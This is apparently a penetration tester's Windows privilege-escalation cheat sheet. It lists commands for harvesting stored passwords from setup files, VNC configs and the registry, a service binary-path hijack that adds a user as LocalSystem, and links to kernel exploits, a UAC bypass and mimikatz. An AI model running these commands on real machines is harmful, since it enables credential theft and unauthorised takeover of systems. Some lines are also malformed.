# Windows Priv escalation 

### Stored credentials
- Search for credentials within:
```
c:\unattend.xml<br/>
Unattend credentials are stored in base64 and can be decoded manually with base64:<br/>
user@host $ base64 -d cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=<br/>
```

- Metasploit Framework enum_unattend module and gather credentials module:<br/>
```
http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/enum_unattend.rb<br/>
http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/credentials/gpp.rb


c:\sysprep.inf<br/>
c:\sysprep\sysprep.xml<br/>
dir c:\*vnc.ini /s /b<br/>
dir c:\*ultravnc.ini /s /b<br/>
dir c:\ /s /b | findstr /si *vnc.ini<br/>

findstr /si password *.txt | *.xml | *.ini<br/>
findstr /si pass *.txt | *.xml | *.ini<br/>
```

- Password recovery programs - small - RDP, Mail, IE, VNC, Dialup, Protected Storage...<br/>
```
http://www.nirsoft.net/password_recovery_tools.html<br/>
Dumping cleartext credentials with mimikatz<br/>
http://pauldotcom.com/2012/02/dumping-cleartext-credentials.html
```
---------------------

### Reg Query


#### VNC Stored:<br/>
- reg query "HKCU\Software\ORL\WinVNC3\Password"

#### Windows Autologin:<br/>
- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"


#### SNMP Parameters:<br/>
- reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"


### Putty clear text proxy credentials:<br/>
- reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"


#### Search the registry - copy (pipe) to the clipboard (optional)<br/>
- reg query HKLM /f password /t REG_SZ /s [ |clip]<br/>
- reg query HKCU /f password /t REG_SZ /s [ |clip]

--------------------
### Change the upnp service binary

```
sc qc upnphostsc config upnphost binpath= "net user <username> /add"<br/>
sc config upnphost obj= ".\LocalSystem" password =""<br/>
net stop upnphost<br/>
net start upnphost<br/>
```

----------------------
## Local Exploit

###  Vulnerability Privilege Escalation


#### Windows kernel privilege escalation
- KiTrap0D<br/>
    - http://lock.cmpxchg8b.com/c0af0967d904cef2ad4db766a00bc6af/KiTrap0D.zip

- Tomcat Windows privilege escalation<br/>
    - http://www.abysssec.com/blog/2008/11/27/tomcat-jrun-privilege-escalation-windows

- NtGdiEnableEudc Exploit (MS11-011) - windows XP SP0-3<br/>
16262,platforms/windows/dos/16262.,"MS11-011(CVE-2011-0045): MS Windows XP WmiTraceMessageVa Integer Truncation Vulnerability<br/> PoC",2011-03-01,"Nikita Tarakanov",windows,dos,0<br/>

```
http://www.securityfocus.com/bid/46136/exploit<br/>
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0045<br/>
http://downloads.securityfocus.com/vulnerabilities/exploits/46136.c<br/>
http://cissrt.blogspot.com/2011/02/cve-2011-0045-ms-windows-xp.html<br/>
http://www.microsoft.com/technet/security/Bulletin/MS11-011.mspx<br/>
```

- Service Tracing Key (MS10-059)<br/>
```
http://www.securityfocus.com/bid/42269/exploit<br/>
http://www.argeniss.com/research/ARGENISS-ADV-081002.txt<br/>
http://www.securityfocus.com/data/vulnerabilities/exploits/Chimichurri.zip<br/>
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2554
```

- Registry Symlink Vuln (MS10-021)<br/>
    - No Public Exploit - VuPEN membership only

- Ryujin - ADF.sys priv esc - ms11-080<br/>

```
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2005<br/>
http://www.exploit-db.com/exploits/18176<br/>
pyinstaller - http://www.pyinstaller.org/<br/>
py2exe - http://www.py2exe.org/
```

- UAC Bypass priv esc<br/>
```
http://www.exploit-db.com/exploits/15609<br/>
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4398<br/>
http://www.microsoft.com/technet/security/Bulletin/MS11-011.mspx<br/>
http://www.securityfocus.com/bid/45045/info
```

Additional References and sources and other links:<br/>
http://www.fuzzysecurity.com/tutorials/16.html <br/>

Encyclopaedia of Windows Privilege escalation - Brett Moor<br/>
http://www.ruxcon.org.au/2011-talks/encyclopaedia-of-windows-privilege-escalation/</username>
